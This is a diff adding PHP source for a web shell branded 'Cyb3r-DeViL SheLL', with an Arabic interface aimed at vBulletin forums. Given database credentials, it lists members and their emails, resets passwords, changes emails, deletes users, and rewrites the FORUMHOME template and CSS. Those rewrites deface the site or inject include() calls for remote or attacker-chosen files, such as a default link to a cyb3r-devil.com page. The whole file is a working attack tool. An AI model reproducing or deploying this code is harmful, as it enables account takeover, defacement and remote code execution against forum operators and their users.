+$query = 'delete * from user where username="' . $vbuser . '";';
+$r = mysql_query($query);
+if ($r)
+{
+echo '<font color=yellow>User : ' . $vbuser . ' was deleted</font>';
+} else {
+echo '<font color=red>User : ' . $vbuser . ' could not be deleted</font>';
+}
+}
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="shell"  && isset($_POST['var']))
+{
+$host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+$var = $_POST['var'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1604;&#1605; &#1610;&#1578;&#1605; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1576;&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1576;&#1602;&#1575;&#1593;&#1583;&#1577; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1593;&#1604;&#1609; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<?
+$Wdt = 'UPDATE `template` SET `template` = \' ".print include($HTTP_GET_VARS[' . $var . '])." \'WHERE `title` =\'FORUMHOME\';';
+$Wdt2= 'UPDATE `style` SET `css` = \' ".print include($HTTP_GET_VARS[' . $var . '])." \', `stylevars` = \'\', `csscolors` = \'\', `editorstyles` = \'\' ;';
+$result=mysql_query($Wdt);
+  if ($result) {echo "<p>Done Exploit.</p><br>Use this : <br> index.php?" . $var . "=shell.txt";}else{
+echo "<p>Error</p>";}
+$result1=mysql_query($Wdt2);
+  if ($result1) { echo "<p>Done Create File</p><br>Use this : <br> index.php?" . $var . "=shell.txt";} else{ echo "<p>Error</p>";}
+}
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="code"  && isset($_POST['code']))
+{
+$host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+$index = $_POST['code'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1604;&#1605; &#1610;&#1578;&#1605; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1576;&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1576;&#1602;&#1575;&#1593;&#1583;&#1577; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1593;&#1604;&#1609; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<?
+$index = $_POST['b'];
+$Wdt = 'UPDATE `template` SET `template` = \' ' . $index . '  \'WHERE `title` =\'FORUMHOME\';';
+$Wdt2= 'UPDATE `style` SET `css` = \' ' . $index . ' \', `stylevars` = \'\', `csscolors` = \'\', `editorstyles` = \'\' ;';
+$result=mysql_query($Wdt);
+  if ($result) {echo "<p>Index was Changed Succefully</p>";}else{
+echo "<p>Failed to change index</p>";}
+$result1=mysql_query($Wdt2);
+if ($result1) {echo "<p>Done Create File</p>";} else{ echo "<p>Error</p>";}
+}
+
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="inc"  && isset($_POST['link']))
+{
+$host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+$vblink = $_POST['link'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1604;&#1605; &#1610;&#1578;&#1605; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1576;&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1576;&#1602;&#1575;&#1593;&#1583;&#1577; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1593;&#1604;&#1609; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<?
+$hack15 = 'UPDATE `template` SET `template` = \'$spacer_open
+{${include(\'\'' . $vblink . '\'\')}}{${exit()}}&
+$_phpinclude_output\'WHERE `title` =\'FORUMHOME\';';
+$hack= 'UPDATE `style` SET `css` = \'$spacer_open
+{${include(\'\'' . $vblink .'\'\')}}{${exit()}}&
+$_phpinclude_output\', `stylevars` = \'\', `csscolors` = \'\', `editorstyles` = \'\' ;';
+$result=mysql_query($hack15) or die(mysql_error());
+$result=mysql_query($hack) or die(mysql_error());
+}
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="mail"  && isset($_POST['vbuser'])  && isset($_POST['vbmail']))
+{
+ $host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+$vbuser = $_POST['vbuser'];
+$vbmail = $_POST['vbmail'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1604;&#1605; &#1610;&#1578;&#1605; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1576;&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1576;&#1602;&#1575;&#1593;&#1583;&#1577; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1593;&#1604;&#1609; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<?
+$query = 'update user set email="' . $vbmail . '" where username="' . $vbuser . '";';
+$re = mysql_query($query);
+if ($re)
+{
+echo '<font size=3><font color=yellow>The E-MAIL of the user </font><font color=red>' . $vbuser . '</font><font color=yellow> was changed to </font><font color=red>' . $vbmail . '</font><br>Back to <a href="?">Shell</a></font>';
+} else {
+echo '<font size=3><font color=red>Failed to change E-MAIL</font></font>';
+}
+}
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="psw"  && isset($_POST['vbuser'])  && isset($_POST['vbpass']))
+{
+$host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+$vbuser = $_POST['vbuser'];
+$vbpass = $_POST['vbpass'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1604;&#1605; &#1610;&#1578;&#1605; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1576;&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1576;&#1602;&#1575;&#1593;&#1583;&#1577; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1593;&#1604;&#1609; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<?
+$query = 'select * from user where username="' . $vbuser . '";';
+$result = mysql_query($query);
+while ($row = mysql_fetch_array($result))
+{
+$salt = $row['salt'];
+$x = md5($vbpass);
+$x =$x . $salt;
+$pass_salt = md5($x);
+$query = 'update user set password="' . $pass_salt . '" where username="' . $vbuser . '";';
+$re = mysql_query($query);
+if ($re)
+{
+echo '<font size=3><font color=yellow>The pass of the user </font><font color=red>' . $vbuser . '</font><font color=yellow> was changed to </font><font color=red>' . $vbpass . '</font><br>Back to <a href="?">Shell</a></font>';
+} else {
+echo '<font size=3><font color=red>Failed to change PassWord</font></font>';
+}
+}
+}
+if(isset($_POST['host']) && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['db']) && $act=="login")
+{
+$host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1604;&#1605; &#1610;&#1578;&#1605; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1576;&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1576;&#1602;&#1575;&#1593;&#1583;&#1577; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1593;&#1604;&#1609; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<form name="changepass" action="?act=psw" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>:::::&#1578;&#1594;&#1610;&#1585; &#1585;&#1602;&#1605; &#1575;&#1604;&#1587;&#1585;&#1610; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;:::::</th><th><input type="submit" name="Change" value="Change" /></th>
+<tr><td>User : </td><td><input name="vbuser" value="Cyb3r-DeViL" /></td></tr>
+<tr><td>Pass : </td><td><input name="vbpass" value="Cyb3r-DeViL" /></td></tr>
+</table>
+<?
+echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
+?>
+</form>
+<hr color="#00FF00" />
+<form name="changepass" action="?act=mail" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>:::::&#1578;&#1594;&#1610;&#1585; &#1575;&#1610;&#1605;&#1610;&#1604; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;:::::</th><th><input type="submit" name="Change" value="Change" /></th>
+<tr><td>User : </td><td><input name="vbuser" value="Cyb3r-DeViL" /></td></tr>
+<tr><td>MAIL : </td><td><input name="vbmail" value="r-9@hotmail.com" /></td></tr>
+</table>
+<?
+echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
+?>
+</form>
+<hr color="#00FF00" />
+<form name="changepass" action="?act=del" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>:::::&#1605;&#1587;&#1581; &#1605;&#1587;&#1578;&#1582;&#1583;&#1605;:::::</th><th><input type="submit" name="Change" value="Change" /></th>
+<tr><td>User : </td><td><input name="vbuser" value="Cyb3r-DeViL" /></td></tr>
+</table>
+<?
+echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
+?>
+</form>
+<hr color="#00FF00" />
+<form name="changepass" action="?act=inc" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>:::::&#1580;&#1583;&#1610;&#1583; &#1581;&#1602;&#1606; &#1575;&#1604;&#1607;&#1610;&#1583;&#1585; &#1605;&#1606; &#1582;&#1604;&#1575;&#1604; &#1585;&#1575;&#1576;&#1591; &#1603;&#1575;&#1605;&#1604;:::::</th><th><input type="submit" name="Change" value="Change" /></th>
+<tr><td>&#1585;&#1575;&#1576;&#1591; &#1575;&#1604;&#1575;&#1606;&#1583;&#1603;&#1587; : </td><td><input name="link" value="http://www.cyb3r-devil.com/hac.html" /></td></tr>
+</table>
+<?
+echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
+?>
+</form>
+<hr color="#00FF00" />
+<form name="changepass" action="?act=code" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>:::::&#1590;&#1593; &#1603;&#1608;&#1583; &#1589;&#1601;&#1581;&#1578;&#1603; &#1604;&#1608;&#1590;&#1593;&#1607;&#1575; :::::</th><th><input type="submit" name="Change" value="Change" /></th>
+<tr><td>Index Code : </td><td><textarea name="code" cols=60 rows=20></textarea></td></tr>
+</table>
+<?
+echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
+?>
+</form>
+<hr color="#00FF00" />
+<form name="changepass" action="?act=shell" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>::::&#1581;&#1602;&#1606; &#1575;&#1604;&#1605;&#1606;&#1578;&#1583;&#1610; &#1601;&#1610; &#1575;&#1604;&#1588;&#1610;&#1604; ::::</th><th><input type="submit" name="Change" value="Change" /></th>
+<tr><td>Variable : </td><td><input name="var" value="shell" /></td></tr>
+</table>
+<?
+echo'<input type="hidden" name="host" value="' . $host . '"><input type="hidden" name="user" value="' . $user . '"><input type="hidden" name="pass" value="' . $pass . '"><input type="hidden" name="db" value="' . $db . '">';
+?>
+</form>
+<?
+}
+if ($act == ''){
+?>
+<form name="myform" action="?act=login" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>:::::&#1605;&#1593;&#1604;&#1608;&#1605;&#1575;&#1578; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577;:::::</th><th><input type="submit" name="Connect" value="&#1575;&#1578;&#1600;&#1600;&#1589;&#1600;&#1600;&#1575;&#1604;" /></th><tr><td>
+        &#1575;&#1604;&#1605;&#1587;&#1578;&#1590;&#1610;&#1601;Host : </td><td><input name="host" value="localhost" /></td></tr>
+<tr><td>&#1610;&#1608;&#1586;&#1585; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; : </td><td><input name="user" value="root" /></td></tr>
+<tr><td>&#1575;&#1604;&#1585;&#1602;&#1605; &#1575;&#1604;&#1587;&#1585;&#1610; : </td><td><input name="pass" value="" /></td></tr>
+<tr><td>&#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; : </td><td><input name="db" value="vb" /></td></tr>
+</table>
+</form>
+
+<?
+}
+if ($act == 'lst' && isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['host']) && isset($_POST['db']))
+{
+$host = $_POST['host'];
+$user = $_POST['user'];
+$pass = $_POST['pass'];
+$db = $_POST['db'];
+mysql_connect($host,$user,$pass) or die('<font color=red>Nope,</font><font color=yellow>&#1604;&#1605; &#1610;&#1578;&#1605; &#1575;&#1604;&#1575;&#1578;&#1589;&#1575;&#1604; &#1576;&#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605;</font>');
+mysql_select_db($db) or die('<font color=red>Nope,</font><font color=yellow>No cOnnection with DB</font>');
+if ($pass == '')
+{
+$npass = 'NULL';
+} else {
+$npass = $pass;
+}
+echo'<font size=3>&#1575;&#1606;&#1578; &#1605;&#1578;&#1589;&#1604; &#1576;&#1602;&#1575;&#1593;&#1583;&#1577; &#1576;&#1610;&#1575;&#1606;&#1575;&#1578; &#1593;&#1604;&#1609; &#1575;&#1604;&#1587;&#1610;&#1585;&#1601;&#1585; <font color=yellow>' . $host . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1605;&#1587;&#1578;&#1582;&#1583;&#1605; : <font color=yellow>' . $user . '</font> , pass : <font color=yellow>' . $npass . '</font> &#1575;&#1587;&#1605; &#1575;&#1604;&#1602;&#1575;&#1593;&#1583;&#1577; <font color=yellow>' . $db . '</font></font>';
+?>
+<hr color="#00FF00" />
+<?
+$re = mysql_query('select * from user');
+echo'<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime"><th>ID</th><th>USERNAME</th><th>EMAIL</th>';
+while ($row = mysql_fetch_array($re))
+{
+echo'<tr><td>' . $row['userid'] . '</td><td>' . $row['username'] . '</td><td>' . $row['email'] . '</td></tr>';
+}
+echo'</table>';
+?>
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime"><th><?
+$count = mysql_num_rows($re);
+echo '&#1593;&#1583;&#1583; &#1575;&#1604;&#1575;&#1593;&#1590;&#1575;&#1569; &#1575;&#1604;&#1605;&#1587;&#1580;&#1604;&#1610;&#1606; : [ ' . $count . ' ]';
+ ?></th></table>
+<?
+}
+if ($act == 'users'){
+?>
+ <form name="myform" action="?act=lst" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>:::::DATABASE CONFIG:::::</th><th><input type="submit" name="Connect" value="Connect" /></th><tr><td>
+        Host : </td><td><input name="host" value="localhost" /></td></tr>
+<tr><td>User : </td><td><input name="user" value="root" /></td></tr>
+<tr><td>Pass : </td><td><input name="pass" value="" /></td></tr>
+<tr><td>Name : </td><td><input name="db" value="vb" /></td></tr>
+</table>
+</form>
+<?
+}
+if ($act=='config')
+{
+?>
+<form name="myform" action="?act=reconfig" method="post">
+<table border="1" bgcolor="#000000" bordercolor="lime"
+bordercolordark="lime" bordercolorlight="lime">
+<th>::&#1605;&#1587;&#1575;&#1585; config::</th><th><input type="submit" name="Connect" value="&#1602;&#1585;&#1575;&#1569;&#1577;" /></th>
+<tr><td>&#1575;&#1604;&#1605;&#1587;&#1575;&#1585; : </td><td><input name="path" value="/home/&#1610;&#1608;&#1586;&#1585; &#1575;&#1604;&#1605;&#1608;&#1602;&#1593;/public_html/includes/config.php" /></td></tr></table></form>
+<?
+}
+if ($act=='index')
+{
+// Index Editor<HTML Editor>
+?>
+<script language='javascript'>
+function link(){
+var X = prompt("EnterText","")
+if (X=="" | X==null ) {
+return;
+}
+var y = prompt("Enterlink","")
+if (y=="" | y==null ) {
+return;
+}
+
+indexform.index.value=indexform.index.value + "<a href=" + y +">"+X+"</a>";
+
+}
+
+function right(){
+var X = prompt("Enter Text","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<p align='right'>"+X+"</p>";
+
+}
+function left(){
+var X = prompt("Enter Text","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<p align='left'>"+X+"</p>";
+
+}
+function center(){
+var X = prompt("Enter Text","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<center>"+X+"</center>";
+
+}
+function colour(){
+var X = prompt("EnterText","")
+if (X=="" | X==null ) {
+return;
+}
+var y = prompt("EnterColour","")
+if (y=="" | y==null ) {
+return;
+}
+
+indexform.index.value=indexform.index.value + "<font color=" + y +">"+X+"</font>";
+
+}
+function b(){
+var X = prompt("Enter Text","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<B>"+X+"</B>";
+
+}
+function u(){
+var X = prompt("Enter Text","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<U>"+X+"</U>";
+
+}
+function i(){
+var X = prompt("Enter Text","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<I>"+X+"</I>";
+
+}
+function mar(){
+var X = prompt("Enter Text","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<marquee>"+X+"</marquee>";
+
+}
+function img(){
+var X = prompt("Enter link","")
+if (X=="" | X==null ) {
+return;
+}
+indexform.index.value=indexform.index.value + "<img src='"+X+"'></img>";
+
+}
+function br(){
+indexform.index.value=indexform.index.value + "<br>";
+
+}
+</script>
+<table border="1" bordercolor="#FF0000" bordercolordark="#FF0000"
+bordercolorlight="#FFFF00"><th><a onclick='return center()'>&#1608;&#1587;&#1591;</a> ||| <a onclick='return left()'>
+        &#1610;&#1587;&#1575;&#1585;</a> ||| <a onclick='return right()'>&#1610;&#1605;&#1610;&#1606;</a> ||| <a onclick='return b()'>
+        &#1593;&#1585;&#1610;&#1590;</a> ||| <a onclick='return u()'>&#1575;&#1587;&#1601;&#1604; &#1575;&#1604;&#1587;&#1591;&#1585;</a> ||| <a onclick='return i()'>
+        &#1605;&#1575;&#1574;&#1604;</a> ||| <a onclick='return br()'>&#1587;&#1591;&#1585; &#1580;&#1583;&#1610;&#1583;</a> ||| <a onclick='return colour()'>
+        &#1604;&#1608;&#1608;&#1606;</a> ||| <a onclick='return mar()'>&#1575;&#1604;&#1582;&#1610;&#1605;&#1577; ||| <a onclick='return img()'>
+        &#1589;&#1608;&#1585;&#1577;</a> ||| <a onclick='return link()'>&#1585;&#1575;&#1576;&#1591;</a></a></th><tr><TD>
+<center><form name="indexform" action="" method="post"><textarea name='index' rows='14' cols='86'></textarea></p>
+</form></form></center>
+</TD></tr><tr><td>&#1575;&#1581;&#1601;&#1592; &#1575;&#1604;&#1603;&#1608;&#1583; &#1604;&#1581;&#1602;&#1606; &#1575;&#1604;&#1601;&#1608;&#1585;&#1605; &#1607;&#1608;&#1605; &#1604;&#1604;&#1605;&#1606;&#1578;&#1583;&#1610; &#1602;&#1610;&#1605;&#1575; &#1576;&#1593;&#1583;</td></tr></table>
+<?
+}
+
+?>
+<hr color="#ff0000" />
+<table border="2" bgcolor="#FFCC00" bordercolor="lime"
+bordercolordark="#FFFF00" bordercolorlight="#FFFF00" style="border-collapse: collapse" cellpadding="2"><tr>
+                <td bgcolor="#0000FF" bordercolorlight="#FFFF00" bordercolordark="#FFFF00"><a href="?">
+                <font size="4">&#1585;&#1574;&#1610;&#1587;&#1610;&#1577; &#1575;&#1604;&#1605;&#1583;&#1605;&#1585;</font></a></td>
+                <td bgcolor="#FF0000" bordercolor="#FF0000" bordercolorlight="#FFFF00" bordercolordark="#FFFF00"><a href="?act=users">
+                <font size="4">&#1593;&#1585;&#1590; &#1575;&#1604;&#1575;&#1593;&#1590;&#1575;&#1569;</font></a></td>
+                <td bordercolor="#FFFF00" bordercolorlight="#FFFF00" bordercolordark="#FFFF00" bgcolor="#000000"><a href="?act=index">
+                <font size="4">&#1589;&#1606;&#1575;&#1593;&#1577; &#1575;&#1604;&#1575;&#1606;&#1583;&#1603;&#1587;</font></a></td>
+                <td bgcolor="#008000" bordercolor="#FF0000" bordercolorlight="#ooFF00" bordercolordark="#0000ff"><a href="?act=config">
+                <font size="4">&#1602;&#1585;&#1575;&#1569;&#1577; &#1575;&#1604;&#1603;&#1608;&#1606;&#1601;&#1610;&#1602;</font></a></td></tr></table>
+
+</center> </body>
+</html>
+
+<tr><td>
+
+
+<hr><center>Copy: <a href="http://www.cyb3r-devil.com">Cyb3r-DeViL SheLL</a> <a href="http://www.cyb3r-devil.com">
+ </a></center></td></table></body></head></html>
